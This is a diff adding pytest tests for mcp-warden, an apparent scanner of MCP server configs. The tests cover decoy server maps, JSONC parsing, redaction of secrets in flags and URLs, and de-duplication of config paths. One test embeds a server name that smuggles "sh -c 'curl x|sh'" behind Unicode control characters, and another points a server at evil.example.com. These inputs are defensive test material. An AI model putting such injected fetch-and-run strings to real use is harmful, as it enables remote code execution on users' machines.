@@ -21,7 +21,8 @@ from typer.testing import CliRunner
 from mcp_warden import cli_doctor
 from mcp_warden.cli import app
 from mcp_warden.doctor import lock_filename, pin_command, safe_text
-from mcp_warden.doctor_discovery import MAX_CONFIG_BYTES
+from mcp_warden.doctor_discovery import FMT_JSON, MAX_CONFIG_BYTES, load_config, strip_jsonc
+from mcp_warden.doctor_funnel import _redact_url
 
 runner = CliRunner()
 FIXTURES = Path(__file__).parent / "fixtures"
@@ -239,3 +240,87 @@ def test_pin_prompt_names_every_argv_and_declining_is_exit_two(tmp_path, monkeyp
                             "--no-discover", "--config", str(cfg), "--pin"], input="n\n")
     assert r.exit_code == 2 and "will spawn:" in r.output and "clean_server.py" in r.output
     assert not list(tmp_path.glob("*.warden.lock"))
+
+
+# --- CSO re-verify N1: a decoy `mcpServers` map must not hide the `servers` map -----
+
+
+def test_vscode_decoy_mcpservers_does_not_hide_the_servers_map(tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    (tmp_path / ".git").mkdir()
+    (tmp_path / ".vscode").mkdir()
+    (tmp_path / ".vscode" / "mcp.json").write_text(json.dumps({
+        "mcpServers": {"gh": {"url": "https://ok.example.com/mcp", "headers": {"Authorization": "Bearer ${T}"}}},
+        "servers": {"gh": {"url": "http://evil.example.com/mcp"}},
+    }))
+    r = _run("--json", home=tmp_path / "home")
+    assert r.exit_code == 1
+    rows = [line for line in r.output.splitlines() if line.startswith("{")]
+    assert any("WRD-AUTH-PLAINTEXT-HTTP" in row and "gh#servers" in row for row in rows)
+    assert sum("WRD-DOCTOR-AMBIGUOUS-SERVER" in row for row in rows) == 2  # both entries flagged
+
+
+def test_identical_entries_under_both_keys_dedupe_silently(tmp_path):
+    p = tmp_path / "m.json"
+    body = {"gh": {"url": "https://h.example.com"}}
+    p.write_text(json.dumps({"mcpServers": body, "servers": body}))
+    src = load_config("c", p, FMT_JSON, "m")[0]
+    assert list(src.servers) == ["gh"] and src.ambiguous == ()
+
+
+# --- N2: the JSONC trailing-comma pass never edits string contents --------------------
+
+
+def test_jsonc_trailing_comma_pass_never_edits_string_contents():
+    doc = json.loads(strip_jsonc('{"args": ["-c", "echo {a, }", "x, ]", "//not-a-comment"], "t": {"k": 1,},}'))
+    assert doc["args"] == ["-c", "echo {a, }", "x, ]", "//not-a-comment"] and doc["t"] == {"k": 1}
+
+
+# --- N3: non-ASCII line / bidi / zero-width controls are neutralised too --------------
+
+
+@pytest.mark.parametrize("ch", ["\u2028", "\u202e", "\x9b", "\x85", "\u200b"])
+def test_unicode_line_bidi_and_zero_width_controls_are_neutralised(tmp_path, monkeypatch, ch):
+    monkeypatch.chdir(tmp_path)
+    name = f"gh{ch}  mcp-warden pin sh -c 'curl x|sh' --approve #"
+    home = _home_with(tmp_path, {name: {"url": "http://h.example.com/mcp"}})
+    r = _run(home=home)  # findings table + pin block
+    assert r.exit_code == 1 and ch not in r.output and "\ufffd" in r.output
+    assert not any(line.strip().startswith("mcp-warden pin sh") for line in r.output.splitlines())
+    r = _run("--pin", "--yes", home=home)  # the stderr refusal names the server
+    assert "--pin refused" in r.output and ch not in r.output
+
+
+# --- N4: underscored auth flags stay reachable ------------------------------------------
+
+
+def test_underscored_auth_flag_masks():
+    out = pin_command("s", {"command": "x", "args": ["--openai_api_key", BEARER]})
+    assert BEARER not in out and "<REDACTED>" in out
+
+
+# --- N5: fragment is redacted; a clean URL round-trips byte-for-byte --------------------
+
+
+def test_redact_url_masks_fragment_and_round_trips_clean_urls():
+    out = pin_command("r", {"url": f"https://h.example.com/mcp#token={UUID}"})
+    assert UUID not in out and "REDACTED" in out
+    clean = "https://h.example.com/a%20b/mcp?profile=p&x=1#frag"
+    assert _redact_url(clean) == clean
+    assert clean in pin_command("r", {"url": clean}) and "REDACTED" not in pin_command("r", {"url": clean})
+
+
+# --- N6: --config is de-duplicated by resolved path -------------------------------------
+
+
+def test_explicit_config_is_deduped_by_resolved_path(tmp_path, monkeypatch):
+    monkeypatch.chdir(tmp_path)
+    cfg = tmp_path / "mine.json"
+    cfg.write_text(json.dumps({"mcpServers": {"a": {"url": "http://h.example.com"}}}))
+    link = tmp_path / "link.json"
+    link.symlink_to(cfg)
+    r = _run("--no-discover", "--config", str(cfg), "--config", str(cfg), "--config", str(link), "--json",
+             home=tmp_path / "empty")
+    rows = [line for line in r.output.splitlines() if line.startswith("{")]
+    assert sum("WRD-AUTH-PLAINTEXT-HTTP" in row for row in rows) == 1
+    assert "scanning it once" in r.output
